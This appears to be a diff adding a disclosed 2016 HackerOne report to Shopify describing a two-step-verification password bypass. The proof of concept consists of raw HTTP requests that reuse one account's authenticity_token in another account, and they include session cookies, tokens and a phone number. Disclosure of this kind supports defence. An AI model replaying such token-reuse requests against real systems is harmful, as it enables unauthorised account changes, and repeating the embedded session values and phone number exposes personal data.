@@ -1,0 +1,75 @@
+ReportLink:https://hackerone.com/reports/124845
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/jbbbkj
+ReportedTo:Shopify(shopify)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:15.04.2016 13:52:15
+
+Summary:
+
+When we enable Two step verification then shopify first ask for password then allow user to set OTP verification. Here i bypassed this password verification.
+Steps to reproduce the vulnerability.
+1.To produce this vulnerability i created two account on shopify . For easy understand let give them name as Account-1 and Account-2 .
+2 Then in account-1 i click on "enable two step verification" and enter password and then choose msg as otp delivery option .
+3.After that request goes like this when i click send sms.(Note : This request is of Account-1 )
+
+POST /admin/users/61826947/2fa/send_sms HTTP/1.1
+Host: pranav2111.myshopify.com
+Connection: keep-alive
+Content-Length: 164
+Accept: text/html, */*; q=0.01
+Origin: https://pranav2111.myshopify.com
+X-CSRF-Token: JTHqOddyHCcNf4FDli1W8YPgfm8Ot+VaCmC7Cv9fRaSam1BO56YCGPybeLwPP0gf1UjAaxrktloxviLYK/3D7Q==
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://pranav2111.myshopify.com/admin/settings/account/61826947
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: _secure_admin_session_id=dcdfb333c3f86c849e450b02b56ffd2b; user_auth_token=3cbcfe7e0190e4305ac74c29f31b8c96; ajs_anonymous_id=%229769d3c8-ad20-4609-874f-a78aa0cd3839%22; __ssid=5ec9ad9a-e032-4f95-a751-3aa871975c14; __utmt=1; _gat=1; _ab=1; storefront_digest=6734c1fe18d51ffeb3010a1e1ee2ac60ed1713a8d9ae4e2cdcfe2572b7bcbacd; _ga=GA1.2.1005531135.1458584824; ajs_user_id=null; ajs_group_id=null; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_s=E42D7057-E27E-48C2-0985; _shopify_y=3A536E63-2299-41F8-666A; _shopify_y=3A536E63-2299-41F8-666A; __utma=1.1005531135.1458584824.1458584867.1458584867.1; __utmb=1.10.10.1458584867; __utmc=1; __utmz=1.1458584867.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; request_method=PUT
+
+utf8=%E2%9C%93&authenticity_token=rsa0kKgaoxEIXhGgG50VRmQlN%2ByJ%2BGy8YhRyyyzs82wRbA7nmM69Lvm66F%2BCjwuoMo2J6J2rP7xZyusZ%2BE51JQ%3D%3D&dial_code=91&phone=9571477801
+
+4.Now i want to bypass password authentication in Account-2  so i replaced cookies , xsrf token , host and user_id in above request and keep authenticity_token same . Now request look loke this . 
+
+POST /admin/users/61715715/2fa/send_sms HTTP/1.1
+Host: pranav211.myshopify.com
+Connection: keep-alive
+Accept: text/html, */*; q=0.01
+Origin: https://pranav2111.myshopify.com
+X-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://pranav211.myshopify.com/admin/settings/account/61715715
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST
+Content-Length: 164
+
+utf8=%E2%9C%93&authenticity_token=rsa0kKgaoxEIXhGgG50VRmQlN%2ByJ%2BGy8YhRyyyzs82wRbA7nmM69Lvm66F%2BCjwuoMo2J6J2rP7xZyusZ%2BE51JQ%3D%3D&dial_code=91&phone=9571477801
+
+
+5.When i submit this request then OTP is successfully delivered to my phone.
+6.Now i have to enter and verify OTP so i made following request and when i submit this request then request goes successful and mobile number is successfully attached to account-2 .
+
+POST /admin/users/61715715/2fa/confirm HTTP/1.1
+Host: pranav211.myshopify.com
+Connection: keep-alive
+Accept: text/html, */*; q=0.01
+Origin: https://pranav2111.myshopify.com
+X-CSRF-Token: Kx73sRC9HbGJj9jLtQ9NgRUC8pQGa4tJpOezLAVH5tIgJum406kGTyWq01inBiQogJopoTONXZHmZsIDKjlmyA==
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://pranav211.myshopify.com/admin/settings/account/61715715
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: _secure_admin_session_id=a8a57b3817251c4f15f6f41049c07efd; user_auth_token=9422e2060214202ffbac68226276f174; ajs_anonymous_id=%226775537b-23a4-49b5-b997-11ecce666834%22; __ssid=1c4fa8d1-7e09-46dd-bb80-1953c602cca9; _shopify_ga=_ga=1.56909218.985506741.1458494246; _ab=1; storefront_digest=9f55a543312d0d3b8c9558ee41c5c028b9bc204952ca6742ae8f627e17c69be4; __utma=1.985506741.1458494246.1458494304.1458584501.2; __utmb=1.23.10.1458584501; __utmc=1; __utmz=1.1458494304.1.1.utmcsr=app.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/services/signup/setup; _ga=GA1.2.985506741.1458494246; ajs_user_id=null; ajs_group_id=null; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_s=DE7FAA92-C077-4FFB-3AA2; _shopify_y=C854D035-5F8B-4E27-F41C; _shopify_y=C854D035-5F8B-4E27-F41C; request_method=POST
+Content-Length: 160
+
+utf8=%E2%9C%93&_method=put&authenticity_token=H5kzy4XUsrrzV%2FCkripXF6IIF%2BeL%2BPGLoWvw1Hbo%2F3qgM4m8tQCshQKzCVs3OEn59KCp45%2BroouatWkGokp5Mw%3D%3D&code=427060
+
+7.Means here authenticity_token is vulnerable , one account authenticity_token can be used in another account.
